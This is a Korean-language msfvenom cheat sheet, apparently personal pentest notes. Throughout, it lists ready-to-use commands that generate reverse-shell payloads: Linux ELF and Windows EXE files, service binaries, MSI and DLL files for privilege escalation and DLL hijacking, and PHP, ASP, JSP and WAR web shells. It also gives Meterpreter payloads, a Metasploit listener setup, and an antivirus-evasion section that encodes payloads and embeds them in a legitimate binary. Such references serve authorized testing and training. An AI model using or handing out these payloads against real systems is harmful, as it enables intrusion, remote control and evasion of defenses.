# msfvenom

# 리버스쉘 — msfvenom 페이로드 생성

---

## Linux

```bash
# ELF (x86)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f elf > shell.elf

# ELF (x64)
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f elf > shell64.elf

# 실행
chmod +x shell.elf
./shell.elf
```

---

## Windows

```bash
# EXE (x86)
msfvenom -p windows/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f exe > shell32.exe

# EXE (x64)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f exe > shell64.exe

# 서비스 바이너리 형태 (권한상승용)
msfvenom -p windows/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f exe-service > service.exe

# MSI (AlwaysInstallElevated)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f msi > evil.msi

# DLL (DLL Hijacking)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f dll > evil.dll
```

---

## 웹쉘

```bash
# PHP
msfvenom -p php/reverse_php LHOST=<칼리IP> LPORT=4444 -f raw > shell.php

# ASP
msfvenom -p windows/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f asp > shell.asp

# ASPX
msfvenom -p windows/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f aspx > shell.aspx

# JSP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f raw > shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f war > shell.war
```

---

## Meterpreter (기능 확장)

```bash
# Linux
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f elf > meter.elf

# Windows
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<칼리IP> LPORT=4444 -f exe > meter.exe
```

---

## 리스너 (Metasploit)

```bash
msfconsole -q
use exploit/multi/handler
set payload windows/x64/shell_reverse_tcp
set LHOST <칼리IP>
set LPORT 4444
exploit -j    # 백그라운드 실행
```

---

## 인코딩 (AV 우회)

```bash
# shikata_ga_nai 인코더
msfvenom -p windows/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 \
  -e x86/shikata_ga_nai -i 5 -f exe > encoded.exe

# 템플릿 바이너리에 삽입
msfvenom -p windows/shell_reverse_tcp LHOST=<칼리IP> LPORT=4444 \
  -x /usr/share/windows-binaries/plink.exe -f exe > payload.exe
```